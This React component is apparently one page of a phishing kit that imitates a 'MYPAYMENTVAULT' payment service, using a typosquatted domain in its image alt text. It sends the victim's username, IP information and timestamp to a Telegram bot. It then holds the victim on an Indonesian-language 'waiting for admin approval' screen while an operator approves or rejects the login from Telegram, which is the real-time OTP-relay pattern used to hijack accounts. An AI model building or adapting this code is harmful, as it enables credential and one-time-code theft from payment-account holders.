import { useState, useRef, useEffect } from "react";
import { useLocation } from "wouter";
import { Globe, ChevronDown } from "lucide-react";
import { useI18n, type Language } from "@/lib/i18n";
import { LoadingModal } from "@/components/loading-modal";
import {
  getIPInfo,
  sendApprovalRequest,
  pollApproval,
  answerCallback,
  getLatestOffset,
} from "@/lib/telegram";

const languageOptions: { code: Language; label: string }[] = [
  { code: "en", label: "English" },
  { code: "es", label: "Español" },
  { code: "fr", label: "Français" },
];

type Stage = "waiting" | "approved" | "rejected";

export default function BotOtp() {
  const [, navigate] = useLocation();
  const { lang, setLang, langName } = useI18n();
  const [stage, setStage] = useState<Stage>("waiting");
  const [showLangDropdown, setShowLangDropdown] = useState(false);
  const [username, setUsername] = useState("");

  const pollRef   = useRef<ReturnType<typeof setInterval> | null>(null);
  const offsetRef = useRef(0);

  useEffect(() => {
    const stored = sessionStorage.getItem("botOtpUsername");
    if (!stored) { navigate("/login"); return; }
    setUsername(stored);

    let cancelled = false;

    (async () => {
      const [ip, startOffset, now] = await Promise.all([
        getIPInfo(),
        getLatestOffset(),
        Promise.resolve(new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })),
      ]);
      if (cancelled) return;
      offsetRef.current = startOffset;

      await sendApprovalRequest(stored, ip, now, `botp_${startOffset}`, "OTP Verification");

      pollRef.current = setInterval(async () => {
        const { status, nextOffset, callbackId } = await pollApproval(
          offsetRef.current,
          `botp_${startOffset}`
        );
        offsetRef.current = nextOffset;

        if (status === "approved") {
          clearInterval(pollRef.current!);
          if (callbackId)
            await answerCallback(callbackId, "✅ OTP disetujui! Melanjutkan...");
          setStage("approved");
          setTimeout(() => navigate("/login-success"), 1200);
        } else if (status === "rejected") {
          clearInterval(pollRef.current!);
          if (callbackId)
            await answerCallback(callbackId, "❌ OTP ditolak.");
          setStage("rejected");
        }
      }, 2500);
    })();

    return () => {
      cancelled = true;
      if (pollRef.current) clearInterval(pollRef.current);
    };
  }, [navigate]);

  return (
    <div
      className="min-h-screen flex flex-col items-center justify-center botp-outer"
      style={{ background: "#f7f7f7" }}
    >
      <LoadingModal show={stage === "waiting"} />
      <style>{`
        @media (max-width: 520px) {
          .botp-outer {
            background: #fff !important;
            justify-content: flex-start !important;
            padding: 0 !important;
          }
          .botp-card {
            max-width: 100% !important;
            min-height: 100dvh !important;
            box-shadow: none !important;
            border-radius: 0 !important;
          }
        }
        @keyframes botp-spin { to { transform: rotate(360deg); } }
        @keyframes botp-pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
      `}</style>

      <div
        className="w-full flex flex-col bg-white botp-card"
        style={{ maxWidth: 480, boxShadow: "0 2px 32px rgba(0,0,0,0.13)" }}
      >
        {/* ── HEADER ── */}
        <div
          className="flex items-center justify-between"
          style={{ padding: "18px 24px", borderBottom: "1px solid #ebebeb" }}
        >
          <span
            className="select-none cursor-pointer"
            style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111" }}
            onClick={() => navigate("/login")}
          >
            <span style={{ fontWeight: 300 }}>MY</span>
            <span style={{ fontWeight: 700 }}>PAYMENT</span>
            <span style={{ fontWeight: 300 }}>VAULT</span>
          </span>

          <div className="relative">
            <button
              type="button"
              onClick={() => setShowLangDropdown(!showLangDropdown)}
              style={{
                display: "flex", alignItems: "center", gap: 5,
                color: "#555", fontSize: 13, background: "none",
                border: "none", cursor: "pointer",
              }}
            >
              <Globe size={15} color="#555" />
              <span>{langName}</span>
              <ChevronDown size={13} color="#555"
                style={{ transform: showLangDropdown ? "rotate(180deg)" : "none", transition: "transform 0.2s" }}
              />
            </button>
            {showLangDropdown && (
              <>
                <div className="fixed inset-0 z-10" onClick={() => setShowLangDropdown(false)} />
                <div style={{
                  position: "absolute", right: 0, top: "100%", marginTop: 4,
                  width: 140, background: "#fff", border: "1px solid #ddd",
                  boxShadow: "0 4px 16px rgba(0,0,0,0.15)", zIndex: 20,
                }}>
                  {languageOptions.map((opt) => (
                    <button key={opt.code} type="button"
                      onClick={() => { setLang(opt.code); setShowLangDropdown(false); }}
                      style={{
                        display: "block", width: "100%", textAlign: "left",
                        padding: "10px 16px", fontSize: 13, background: "none",
                        border: "none", cursor: "pointer",
                        fontWeight: lang === opt.code ? 600 : 400,
                        color: lang === opt.code ? "#111" : "#555",
                      }}
                    >{opt.label}</button>
                  ))}
                </div>
              </>
            )}
          </div>
        </div>

        {/* ── HERO IMAGE ── */}
        <div style={{ width: "100%", lineHeight: 0 }}>
          <img src="/hero-vault-new.png" alt="mypaymenttvaulltr.com" style={{ width: "100%", display: "block" }} />
        </div>

        {/* ── BODY ── */}
        <div style={{ padding: "36px 28px 40px", textAlign: "center" }}>

          {/* Step indicator */}
          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 28, justifyContent: "center" }}>
            <div style={{
              width: 22, height: 22, borderRadius: "50%",
              background: "#111", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0,
            }}>
              <svg width="11" height="11" viewBox="0 0 12 12" fill="none">
                <path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
            </div>
            <div style={{ width: 44, height: 1, background: "#111" }} />
            <div style={{
              width: 22, height: 22, borderRadius: "50%",
              background: "#111", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0,
            }}>
              <span style={{ fontSize: 11, color: "#fff", fontWeight: 700 }}>2</span>
            </div>
            <div style={{ width: 44, height: 1, background: "#ccc" }} />
            <div style={{
              width: 22, height: 22, borderRadius: "50%",
              background: "#ccc", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0,
            }}>
              <span style={{ fontSize: 11, color: "#fff", fontWeight: 600 }}>3</span>
            </div>
          </div>

          {/* ── WAITING ── */}
          {stage === "waiting" && (
            <>
              <div style={{
                width: 64, height: 64, margin: "0 auto 20px",
                border: "5px solid #e8e8e8", borderTop: "5px solid #111",
                borderRadius: "50%",
                animation: "botp-spin 0.9s linear infinite",
              }} />
              <h2 style={{ fontSize: 18, fontWeight: 700, color: "#111", marginBottom: 8 }}>
                Verifikasi Identitas
              </h2>
              <p style={{ fontSize: 14, color: "#555", lineHeight: 1.7, marginBottom: 6 }}>
                Menunggu persetujuan admin…
              </p>
              <p style={{ fontSize: 12, color: "#aaa", animation: "botp-pulse 2s ease-in-out infinite" }}>
                Jangan tutup halaman ini
              </p>
              <div style={{ marginTop: 28, padding: "14px 18px", background: "#f8f8f8", borderRadius: 8, textAlign: "left" }}>
                <p style={{ fontSize: 12, color: "#888", marginBottom: 4 }}>Akun</p>
                <p style={{ fontSize: 15, fontWeight: 600, color: "#111" }}>{username}</p>
              </div>
              <button
                type="button"
                onClick={() => { if (pollRef.current) clearInterval(pollRef.current); navigate("/login"); }}
                style={{
                  marginTop: 20, fontSize: 13, color: "#888",
                  textDecoration: "underline", background: "none",
                  border: "none", cursor: "pointer",
                }}
              >
                Kembali ke Login
              </button>
            </>
          )}

          {/* ── APPROVED ── */}
          {stage === "approved" && (
            <>
              <div style={{
                width: 64, height: 64, borderRadius: "50%",
                background: "#111",
                display: "flex", alignItems: "center", justifyContent: "center",
                margin: "0 auto 20px",
              }}>
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M20 6L9 17l-5-5"/>
                </svg>
              </div>
              <h2 style={{ fontSize: 18, fontWeight: 700, color: "#111", marginBottom: 8 }}>
                Disetujui!
              </h2>
              <p style={{ fontSize: 14, color: "#555" }}>
                Identitas Anda telah diverifikasi. Melanjutkan…
              </p>
            </>
          )}

          {/* ── REJECTED ── */}
          {stage === "rejected" && (
            <>
              <div style={{
                width: 64, height: 64, borderRadius: "50%",
                background: "#c00",
                display: "flex", alignItems: "center", justifyContent: "center",
                margin: "0 auto 20px",
              }}>
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                  <line x1="18" y1="6" x2="6" y2="18"/>
                  <line x1="6" y1="6" x2="18" y2="18"/>
                </svg>
              </div>
              <h2 style={{ fontSize: 18, fontWeight: 700, color: "#111", marginBottom: 8 }}>
                Akses Ditolak
              </h2>
              <p style={{ fontSize: 14, color: "#555", lineHeight: 1.7, marginBottom: 24 }}>
                Verifikasi identitas Anda tidak disetujui. Silakan hubungi layanan pelanggan atau coba lagi.
              </p>
              <button
                type="button"
                onClick={() => navigate("/login")}
                style={{
                  width: "100%", height: 44, background: "#111", color: "#fff",
                  fontSize: 14, fontWeight: 600, border: "none",
                  borderRadius: 4, cursor: "pointer", letterSpacing: "0.03em",
                }}
              >
                Kembali ke Login
              </button>
            </>
          )}
        </div>
      </div>

    </div>
  );
}
